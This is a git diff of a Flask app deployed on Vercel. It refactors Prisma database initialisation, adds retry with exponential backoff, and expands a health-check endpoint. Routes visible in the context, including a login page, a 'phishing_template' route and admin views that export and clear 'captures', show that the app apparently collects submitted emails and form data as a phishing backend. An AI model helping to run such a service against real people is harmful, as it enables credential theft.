@@ -4,6 +4,7 @@ import os
 import json
 import sys
 import subprocess
+import time
 from dotenv import load_dotenv
 import asyncio
 from functools import wraps
@@ -12,28 +13,19 @@ from functools import wraps
 load_dotenv()
 
 # Apply nest_asyncio for better asyncio support
-import nest_asyncio
-nest_asyncio.apply()
-
-# Handle Prisma import with error handling
 try:
-    from prisma import Prisma
+    import nest_asyncio
+    nest_asyncio.apply()
 except ImportError:
-    print("Prisma client not found, attempting to generate...")
-    try:
-        subprocess.check_call(["python", "-m", "pip", "install", "prisma", "--upgrade"])
-        subprocess.check_call(["python", "-m", "prisma", "generate"])
-        from prisma import Prisma
-        print("Prisma client generated successfully.")
-    except Exception as e:
-        print(f"Error generating Prisma client: {e}")
-        raise
+    print("Warning: nest_asyncio not available")
 
+# Initialize Flask app
 app = Flask(__name__)
 app.secret_key = os.getenv('SECRET_KEY', 'fallback-secret-key-change-in-production')
 
-# Initialize Prisma client
-db = Prisma()
+# Global variable to track Prisma initialization status
+prisma_initialized = False
+db = None
 
 def async_route(f):
     """Decorator to handle async routes in Flask"""
@@ -42,38 +34,79 @@ def async_route(f):
         return asyncio.run(f(*args, **kwargs))
     return wrapper
 
+async def initialize_prisma():
+    """Initialize Prisma client once per process"""
+    global prisma_initialized, db
+    
+    if prisma_initialized:
+        return
+    
+    # Attempt to import and initialize Prisma
+    try:
+        from prisma import Prisma
+        db = Prisma()
+        prisma_initialized = True
+        print("Prisma client initialized successfully")
+    except ImportError:
+        print("Prisma client not found, attempting to generate...")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "prisma==0.11.0", "--upgrade"])
+            subprocess.check_call([sys.executable, "-m", "prisma", "generate"])
+            from prisma import Prisma
+            db = Prisma()
+            prisma_initialized = True
+            print("Prisma client generated and initialized successfully.")
+        except Exception as e:
+            print(f"Error generating Prisma client: {e}")
+            raise
+
 async def ensure_connected():
     """Ensure database is connected with retry logic"""
-    max_retries = 5  # Increased retries
+    global db
+    
+    # Make sure Prisma is initialized
+    await initialize_prisma()
+    
+    # Connect to database
+    max_retries = 5
+    backoff_factor = 1.5
+    
     for attempt in range(max_retries):
         try:
-            # Always disconnect first in serverless environment
+            # Always disconnect first in serverless environment to avoid connection issues
             try:
-                if db.is_connected():
+                if db and db.is_connected():
                     await db.disconnect()
-            except Exception:
-                pass  # Ignore disconnect errors
+            except Exception as e:
+                print(f"Disconnect error (non-critical): {e}")
                 
             # Check if DATABASE_URL is set
             db_url = os.getenv('DATABASE_URL')
             if not db_url:
                 raise Exception("DATABASE_URL environment variable is not set")
                 
-            # Connect with explicit timeout
-            await asyncio.wait_for(db.connect(), timeout=5.0)
+            # Connect with timeout
+            print(f"Connecting to database (attempt {attempt + 1}/{max_retries})...")
+            await asyncio.wait_for(db.connect(), timeout=10.0)
             print(f"Database connected successfully on attempt {attempt + 1}")
             return
         except Exception as e:
             print(f"Database connection attempt {attempt + 1} failed: {e}")
             if attempt == max_retries - 1:
                 raise
-            await asyncio.sleep(1)
+            
+            # Exponential backoff
+            sleep_time = backoff_factor ** attempt
+            print(f"Retrying in {sleep_time:.2f} seconds...")
+            await asyncio.sleep(sleep_time)
 
 async def get_stats():
     """Calculate real statistics from database"""
-    await ensure_connected()
+    global db
     
     try:
+        await ensure_connected()
+        
         # Get total attempts
         total_attempts = await db.capture.count()
         
@@ -131,8 +164,8 @@ async def login():
                 pass
         
         # Save to database
-        await ensure_connected()
         try:
+            await ensure_connected()
             await db.capture.create(
                 data={
                     'email': email,
@@ -176,9 +209,9 @@ async def admin():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
-    await ensure_connected()
-    
     try:
+        await ensure_connected()
+        
         # Get all captures ordered by newest first
         captures = await db.capture.find_many(
             order={
@@ -222,9 +255,8 @@ async def clear_data():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
-    await ensure_connected()
-    
     try:
+        await ensure_connected()
         await db.capture.delete_many()
         print("All capture data cleared")
     except Exception as e:
@@ -238,9 +270,9 @@ async def export_data():
     if not session.get('logged_in'):
         return redirect(url_for('admin_login'))
     
-    await ensure_connected()
-    
     try:
+        await ensure_connected()
+        
         captures = await db.capture.find_many(
             order={
                 'timestamp': 'desc'
@@ -289,8 +321,8 @@ async def phishing_template(template_name):
                 pass
         
         # Save to database
-        await ensure_connected()
         try:
+            await ensure_connected()
             await db.capture.create(
                 data={
                     'email': email,
@@ -332,11 +364,25 @@ async def api_stats():
 @app.route('/health')
 @async_route
 async def health():
+    start_time = time.time()
+    db_status = "not_checked"
+    db_error = None
+    
     try:
-        await ensure_connected()
-        db_status = "connected"
+        # Initialize Prisma without full connection
+        await initialize_prisma()
+        init_status = "success" if prisma_initialized else "failed"
+        
+        # Try to connect to the database
+        try:
+            await ensure_connected()
+            db_status = "connected"
+        except Exception as e:
+            db_status = "error"
+            db_error = str(e)
     except Exception as e:
-        db_status = f"error: {str(e)}"
+        init_status = "error"
+        db_error = str(e)
     
     # Get environment variables (with sensitive parts masked)
     env_vars = {}
@@ -348,20 +394,27 @@ async def health():
     if db_url != 'not set':
         # Replace password with asterisks
         import re
-        masked_url = re.sub(r'(postgresql://[^:]+:)[^@]+(@.+)', r'\1*****\2', db_url)
-        env_vars['DATABASE_URL'] = masked_url
+        try:
+            masked_url = re.sub(r'(postgresql://[^:]+:)[^@]+(@.+)', r'\1*****\2', db_url)
+            env_vars['DATABASE_URL'] = masked_url
+        except:
+            env_vars['DATABASE_URL'] = "present but invalid format"
     
     # Check other environment variables existence
     for key in ['SECRET_KEY', 'ADMIN_USERNAME', 'ADMIN_PASSWORD']:
         env_vars[f"{key}_set"] = 'yes' if os.environ.get(key) else 'no'
     
+    response_time = time.time() - start_time
+    
     return jsonify({
         'status': 'healthy',
         'timestamp': datetime.datetime.now().isoformat(),
+        'response_time_ms': round(response_time * 1000, 2),
+        'prisma_init': init_status,
         'database_status': db_status,
+        'database_error': db_error,
         'python_version': '.'.join(map(str, sys.version_info[:3])),
-        'environment': env_vars,
-        'prisma_version': os.environ.get('PRISMA_VERSION', 'unknown')
+        'environment': env_vars
     })
 
 # Export the Flask app for Vercel
